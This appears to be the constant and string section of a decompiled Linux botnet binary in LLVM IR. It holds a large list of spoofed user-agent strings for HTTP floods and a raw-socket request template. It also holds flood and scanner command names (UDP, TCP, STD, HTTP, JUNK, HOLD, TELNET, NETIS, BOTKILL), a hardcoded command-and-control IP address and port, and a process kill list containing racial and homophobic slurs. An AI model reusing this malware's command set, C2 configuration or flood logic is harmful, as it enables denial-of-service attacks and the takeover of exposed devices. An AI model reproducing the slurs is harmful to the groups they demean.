@global_var_10017684.346 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_100176c4.347 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_10017754.348 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_1001778c.349 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_100177ac.350 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_100177c4.351 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_1001781c.352 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_100178bc.353 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_10017910.354 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_10017984.355 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_100179c4.356 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_10017a7c.357 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_10017ad0.358 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_10017b28.359 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_10017b80.360 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_10017bc0.361 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_10017c08.362 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_10017c60.363 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_10017ccc.364 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_10017d24.365 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_10017d74.366 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_10017d98.367 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_10017df4.368 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_10017e04.369 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_10017e34.370 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_10017e58.371 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_10017e7c.372 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_10017e98.373 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_10017ed8.374 = constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_10017f64.375 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_10017fac.376 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_10017ff4.377 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1001803c.378 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_10018084.379 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_100180d8.380 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_10018128.381 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_10018194.382 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_100181e8.383 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_10018244.384 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_100182a0.385 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_10018304.386 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_10018360.387 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_100183bc.388 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_10018418.389 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_10018478.390 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_100184c0.391 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_10018558.392 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_100185a4.393 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_100185f0.394 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_10018640.395 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_10018688.396 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_100186dc.397 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_1001872c.398 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_10018774.399 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_100187c0.400 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_1001880c.401 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_10018854.402 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_100188a4.403 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_100188f4.404 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_10018928.405 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_1001895c.406 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_100189a4.407 = constant [62 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_10017644.345, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_10017684.346, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_100176c4.347, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_10017754.348, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_1001778c.349, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_100177ac.350, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_100177c4.351, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_1001781c.352, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_100178bc.353, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_10017910.354, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_10017984.355, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_100179c4.356, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_10017a7c.357, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_10017ad0.358, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_10017b28.359, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_10017b80.360, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_10017bc0.361, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_10017c08.362, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_10017c60.363, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_10017ccc.364, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_10017d24.365, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_10017d74.366, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_10017d98.367, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_10017df4.368, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_10017e04.369, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_10017e34.370, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_10017e58.371, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_10017e7c.372, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_10017e98.373, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @global_var_10017ed8.374, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_10017f64.375, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_10017fac.376, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_10017ff4.377, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_1001803c.378, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_10018084.379, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_100180d8.380, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_10018128.381, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_10018194.382, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_100181e8.383, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_10018244.384, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @global_var_100182a0.385, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_10018304.386, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_10018360.387, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_100183bc.388, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @global_var_10018418.389, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_10018478.390, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_100184c0.391, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_10018558.392, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_100185a4.393, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_100185f0.394, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_10018640.395, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_10018688.396, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_100186dc.397, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_1001872c.398, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_10018774.399, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_100187c0.400, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_1001880c.401, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_10018854.402, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_100188a4.403, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_100188f4.404, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_10018928.405, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_1001895c.406, i32 0, i32 0)]
@global_var_1001761c.408 = constant [6 x i8] c"close\00"
@global_var_10017624.409 = constant [11 x i8] c"keep-alive\00"
@global_var_10017630.410 = constant [7 x i8] c"accept\00"
@global_var_10018a9c.414 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_10009760.415 = constant i32 939524096
@global_var_100097d8.416 = constant [3 x i8] c"8`\00"
@global_var_10018adc.417 = constant [6 x i8] c"arfgG\00"
@global_var_10018ae4.418 = constant [9 x i8] c"HBiug655\00"
@global_var_10018af0.419 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_10018b00.420 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_10018b14.421 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_10018b28.422 = constant [12 x i8] c"GJjyur67458\00"
@global_var_10018b34.423 = constant [12 x i8] c"RYSDk747586\00"
@global_var_10018b40.424 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_10018b4c.425 = constant [10 x i8] c"KHGK7985i\00"
@global_var_10018b58.426 = constant [11 x i8] c"yuituiILYF\00"
@global_var_10018b64.427 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_10018b74.428 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_10018b80.429 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_10018b90.430 = constant [9 x i8] c"ewqdcftr\00"
@global_var_10018b9c.431 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_10018bac.432 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_10018bb8.433 = constant [12 x i8] c"twehgbferhb\00"
@global_var_10018bc4.434 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_10018bd0.435 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_10018be0.436 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_10018bf0.437 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_10018c00.438 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_10018c0c.439 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_10018c1c.440 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_10018c2c.441 = constant [12 x i8] c"yteytietyue\00"
@global_var_10018c38.442 = constant [9 x i8] c"qsortEQS\00"
@global_var_10018c44.443 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_10018c54.444 = constant [4 x i8] c"std\00"
@global_var_10018c58.445 = constant [4 x i8] c"dts\00"
@global_var_10018c5c.446 = constant [6 x i8] c"hackz\00"
@global_var_10018c64.447 = constant [7 x i8] c"shdyed\00"
@global_var_10018c6c.448 = constant [5 x i8] c"http\00"
@global_var_10018c74.449 = constant [10 x i8] c"sghwiondc\00"
@global_var_10018c80.450 = constant [7 x i8] c"nigger\00"
@global_var_10018c88.451 = constant [6 x i8] c"pussy\00"
@global_var_10018c90.452 = constant [7 x i8] c"faggot\00"
@global_var_10018c98.453 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018adc.417, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10018ae4.418, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10018af0.419, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_10018b00.420, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_10018b14.421, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10018b28.422, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10018b34.423, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10018b40.424, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10018b4c.425, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10018b58.426, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10018b64.427, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10018b74.428, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10018b80.429, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10018b90.430, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10018b9c.431, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10018bac.432, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10018bb8.433, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10018bc4.434, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10018bd0.435, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10018be0.436, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10018bf0.437, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10018c00.438, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10018c0c.439, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10018c1c.440, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10018c2c.441, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10018c38.442, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10018c44.443, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018c54.444, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018c58.445, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018c5c.446, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10018c64.447, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10018c6c.448, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10018c74.449, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10018c80.450, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018c88.451, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10018c90.452, i32 0, i32 0)]
@global_var_10009920.454 = constant i32 1207988701
@global_var_100099a0.455 = constant [3 x i8] c"8`\00"
@global_var_100099c8.456 = constant [3 x i8] c"8`\00"
@global_var_100099d0.457 = constant i32 939524096
@global_var_10018d28.458 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_10009ae4.459 = constant i32 1207960808
@global_var_10009b38.460 = constant [3 x i8] c"8`\00"
@global_var_10009c28.461 = constant i32 1207960468
@global_var_10018d44.462 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_10009c78.463 = constant i32 1207960388
@global_var_10009cac.464 = constant i32 1207987793
@global_var_1000a084.465 = constant [3 x i8] c"8`\00"
@global_var_1000a094.466 = constant [3 x i8] c"8`\00"
@global_var_1000a1c4.467 = constant i32 1207960884
@global_var_1000a214.468 = constant i32 1207960804
@global_var_10018d68.469 = constant [4 x i8] c"all\00"
@global_var_10018d6c.470 = constant i32 738197504
@global_var_10018d70.471 = constant [4 x i8] c"syn\00"
@global_var_10018d74.472 = constant [4 x i8] c"rst\00"
@global_var_10018d78.473 = constant [4 x i8] c"fin\00"
@global_var_10018d7c.474 = constant [4 x i8] c"ack\00"
@global_var_10018d80.475 = constant [4 x i8] c"psh\00"
@global_var_10018d84.476 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_1000a4e8.477 = constant [3 x i8] c"8`\00"
@global_var_1000a84c.478 = constant [3 x i8] c"8`\00"
@global_var_1000a9a0.479 = constant i32 1207960216
@global_var_1000adc0.480 = constant [3 x i8] c"8`\00"
@global_var_1000af14.481 = constant i32 1207960392
@global_var_10018d98.482 = constant [6 x i8] c"PONG!\00"
@global_var_1000b32c.483 = constant i32 1207964528
@global_var_10018da0.484 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_10018dac.485 = constant [10 x i8] c"My IP: %s\00"
@global_var_1000b390.486 = constant i32 1207964428
@global_var_10018db8.487 = constant [8 x i8] c"BOTKILL\00"
@global_var_10018dc0.488 = constant [13 x i8] c"Killing Bots\00"
@global_var_1000b3ec.489 = constant [3 x i8] c"8`\00"
@global_var_10018dd0.490 = constant [7 x i8] c"LOOPME\00"
@global_var_10018dd8.491 = constant [16 x i8] c"LOOPING PAYLOAD\00"
@global_var_1000b448.492 = constant [3 x i8] c"8`\00"
@global_var_10018de8.493 = constant [7 x i8] c"TELNET\00"
@global_var_10018df0.494 = constant [16 x i8] c"TELNET ON | OFF\00"
@global_var_1000b49c.495 = constant i32 1207964160
@global_var_10018e00.496 = constant [4 x i8] c"OFF\00"
@global_var_1002abd8.497 = local_unnamed_addr global i32 0
@global_var_10018e04.498 = constant [5 x i8] c" OFF\00"
@global_var_10018e0c.499 = constant [3 x i8] c"ON\00"
@global_var_1000b588.500 = constant [3 x i8] c"8`\00"
@global_var_10018e10.501 = constant [6 x i8] c"NETIS\00"
@global_var_10018e18.502 = constant [25 x i8] c"[NETIS] SCANNER Starting\00"
@global_var_1000b608.503 = constant [3 x i8] c"8`\00"
@global_var_10018e34.504 = constant [5 x i8] c"HOLD\00"
@global_var_1000b728.505 = constant [3 x i8] c"8`\00"
@global_var_1000b730.506 = constant [3 x i8] c"8`\00"
@global_var_1000b778.507 = constant [3 x i8] c"8`\00"
@global_var_10018e3c.508 = constant [5 x i8] c"JUNK\00"
@global_var_1000b8a8.509 = constant [3 x i8] c"8`\00"
@global_var_1000b8b0.510 = constant [3 x i8] c"8`\00"
@global_var_1000b8f8.511 = constant [3 x i8] c"8`\00"
@global_var_10018e44.512 = constant [4 x i8] c"UDP\00"
@global_var_1000bb58.513 = constant [3 x i8] c"8`\00"
@global_var_1000bb60.514 = constant [3 x i8] c"8`\00"
@global_var_1000bbb4.515 = constant [3 x i8] c"8`\00"
@global_var_10018e48.516 = constant [5 x i8] c"HTTP\00"
@global_var_1000bce0.517 = constant [3 x i8] c"8`\00"
@global_var_1000bce8.518 = constant [3 x i8] c"8`\00"
@global_var_1000bdb8.519 = constant [3 x i8] c"8`\00"
@global_var_10018e50.520 = constant [4 x i8] c"CNC\00"
@global_var_1000bee8.521 = constant [3 x i8] c"8`\00"
@global_var_1000bef0.522 = constant [3 x i8] c"8`\00"
@global_var_1000bf38.523 = constant [3 x i8] c"8`\00"
@global_var_10018e54.524 = constant [6 x i8] c"COMBO\00"
@global_var_1000c088.525 = constant [3 x i8] c"8`\00"
@global_var_1000c090.526 = constant [3 x i8] c"8`\00"
@global_var_1000c0f8.527 = constant [3 x i8] c"8`\00"
@global_var_10018e5c.528 = constant [4 x i8] c"STD\00"
@global_var_1000c218.529 = constant [3 x i8] c"8`\00"
@global_var_1000c220.530 = constant [3 x i8] c"8`\00"
@global_var_1000c268.531 = constant [3 x i8] c"8`\00"
@global_var_10018e60.532 = constant [4 x i8] c"TCP\00"
@global_var_1000c4d8.533 = constant [3 x i8] c"8`\00"
@global_var_1000c4e0.534 = constant [3 x i8] c"8`\00"
@global_var_1000c538.535 = constant [3 x i8] c"8`\00"
@global_var_10018e64.536 = constant [5 x i8] c"STOP\00"
@global_var_10018e6c.537 = constant [12 x i8] c"HOODASSSHIT\00"
@global_var_1002ab68.538 = local_unnamed_addr global i32 -1
@global_var_10015d18.539 = constant [16 x i8] c"188.213.170.176\00"
@global_var_1002ab58.540 = global [16 x i8]* @global_var_10015d18.539
@global_var_1002ab5c.541 = local_unnamed_addr global i32 47
@global_var_10018e78.542 = constant [8 x i8] c"8.8.8.8\00"
@global_var_10018e80.543 = constant [16 x i8] c"/proc/net/route\00"
@global_var_10018e90.544 = constant [11 x i8] c"\0900000000\09\00"
@global_var_1000ca88.545 = constant i32 939524096
@global_var_1002abb8.546 = global i32 0
@global_var_1000cadc.547 = constant i32 1207959564
@global_var_10018e9c.548 = constant [16 x i8] c"/usr/bin/python\00"
@global_var_10018eac.549 = constant [7 x i8] c"SERVER\00"
@global_var_10018eb4.550 = constant [7 x i8] c"ROUTER\00"
@global_var_10018ebc.551 = constant i32 0
@global_var_10018ec0.552 = constant [5 x i8] c"sshd\00"
@global_var_10018ec8.553 = constant [19 x i8] c"/usr/sbin/dropbear\00"
@global_var_1002ab64.554 = local_unnamed_addr global i32 1
@global_var_10018edc.555 = constant [13 x i8] c"BUILD %s:%s\0A\00"
@global_var_1000ccb0.556 = constant [3 x i8] c"8`\00"
@global_var_1000ccd0.557 = constant [3 x i8] c"8`\00"
@global_var_1000ccf4.558 = constant i32 1207962665
@global_var_1000cd20.559 = constant [3 x i8] c"8`\00"
@global_var_1000cd54.560 = constant i32 1207963409
@global_var_10018eec.561 = constant i32 788529152
@global_var_1000cd64.562 = constant [3 x i8] c"8`\00"
@global_var_1000cd70.563 = constant i32 1207959556
@global_var_10018ef0.564 = constant i32 458961211
@global_var_10018f34.565 = constant [8 x i8] c"Love <3\00"
@global_var_1000cde0.566 = constant i32 939524096
@global_var_10018f3c.567 = constant [5 x i8] c"PONG\00"
@global_var_1000d124.568 = constant i32 1207960708
@global_var_10018f44.569 = constant [4 x i8] c"DUP\00"
@global_var_10018f48.570 = constant [5 x i8] c"MOVE\00"
@global_var_10018f50.571 = constant [8 x i8] c"%s 2>&1\00"
@0 = constant i32 1912602624
@global_var_1000d3ec.573 = constant [3 x i8] c"8`\00"
@global_var_1000d41c.574 = constant [3 x i8] c"8`\00"
@global_var_1000d424.575 = constant i32 939524097
@global_var_10018f5c.576 = constant i32 536870912
@global_var_1000d660.577 = constant i32 1207959564
@global_var_1000dce0.578 = constant i32 939524118
@global_var_1002ab70 = external local_unnamed_addr global i32
@global_var_1002ac08.584 = global i32 0
@global_var_1000e098.585 = constant [3 x i8] c" c\00"
